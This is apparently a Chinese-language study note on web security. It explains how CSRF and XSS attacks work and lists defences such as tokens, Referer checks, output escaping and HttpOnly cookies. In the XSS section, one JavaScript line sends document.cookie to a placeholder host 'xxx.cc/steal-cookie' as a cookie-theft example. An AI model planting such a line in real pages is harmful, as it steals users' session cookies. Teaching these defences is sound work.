### 关于XSS和CSRF

#### CSRF（Cross-site request forgery）

> CSRF：简单来说，CSRF就是如果我们登录了一个正常网站A并且在本地生成Cookie，并且未退出的情况下，同时又访问了另一个危险网站B，网站B里面有一段恶意脚本，通过利用（图片的src避开跨域限制之类）本地的cookies来（冒充用户）通过验证并且成功访问A网站的接口来实现一些操作。[具体浏览](http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)

若是没有同源策略，那么网络安全可能就会差上很多，不仅仅是不同页面之间可以相互访问对方的服务接口，还因为是cookies可以随意被别的网页上的脚本访问并且可以直接访问带权限的接口，这对于恶意网站来说，想要操作用户的账户做任何操作实在是太轻松了。所以同源策略是必须的。

整理一下攻击过程：

1. 用户 C 登录信任网站 A
2. **通过验证，在用户 C 处产生 A 的 cookie**
3. **用户在没有登出 A 的情况下，访问危险网站 B**
4. B 要求访问网站 A，发出一个请求
5. 用户 C 的浏览器就会访问 A，并带着 cookie
6. 网站 A 根据 cookie 拿到用户 C 权限，但是却做着 B 的请求


**CSRF 之所以出现就是因为 Web 的身份验证机制，服务器虽然可以通过 cookie，session 来保证一个请求是来自于某个用户的，但是却无法保证该请求是不是用户批准发送的**



**防范原理：**

**能够识别出哪些请求是非正常用户主动发起的**。这就要求我们**在请求中嵌入一些额外的授权数据，让网站服务器能够区分出这些未授权的请求**



**防范策略：**

- 使用`post`请求


- 验证 `HTTP Referer` 字段，利用 `HTTP` 头中的 `Referer` 判断请求来源是否合法。
  - `Referer` 的值是由浏览器提供的，不可全信，低版本浏览器下 `Referer` 存在伪造风险。
  - 用户自己可以设置浏览器使其在发送请求时不再提供 `Referer` 时，网站将拒绝合法用户的访问。
- 使用验证码
- 以`HTTP` 请求参数的形式加入一个随机产生的 `token` 交由服务端验证。（若没带上`token`或不正确，则请求失败）
- 在 `HTTP` 头中自定义属性并验证 `One-Time Tokens`，将 `token` 放到 `HTTP` 头中自定义的属性里。通过 `XMLHttpRequest` 的异步请求交由后端校验，并且一次有效。





#### XSS

> 还有一种常见的被动攻击方式：XSS，应该是在网站中插入代码来盗取用户的cookie。原理是通过JavaScript代码注入页面。

- `Reflected XSS`（基于反射的 `XSS` 攻击）：主要通过利用**系统反馈**行为漏洞，并欺骗用户主动触发，从而发起 `Web` 攻击。
- `Stored XSS`（基于存储的 `XSS` 攻击）：`Stored XSS` 和 `Reflected XSS` 的差别就在于，具有攻击性的脚本被保存到了服务器并且可以被普通用户完整的从服务的取得并执行，从而获得了在网络上传播的能力。
- `DOM-based or local XSS`（基于 `DOM` 或本地的 `XSS` 攻击）：`DOM` 型 `XSS` 其实是一种特殊类型的反射型 `XSS`，它是基于 `DOM` 文档对象模型的一种漏洞。可以通过 `DOM` 来动态修改页面内容，从客户端获取 `DOM` 中的数据并在本地执行。基于这个特性，就可以利用 `JS` 脚本来实现 `XSS` 漏洞的利用。

```js
// 常见的XSS插入到DOM的代码，盗取用户的cookie
(new Image()).src = 'http://xxx.cc/steal-cookie?cookies=' + document.cookie
```

**防范策略：**

- 在客户端和服务端对用户输入进行过滤，在客户端对输出进行转义，主要转义类似`<`，`>`，`'`，`"`，`&`这些字符。

  - 比如说，当页面上直接使用`innerHTML`来塞入一些信息时，最好先把这段HTML字符串进行转义，把`<`转成`&lt;`，把`>`转成`&gt;`，这样子就能防止一些插入HTML动态执行脚本的行为。

    ```js
    function encodeHTML (a) {
      return String(a)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#39;")
    }
    ```

- 使用 `HTTP only` 的 `Cookie`。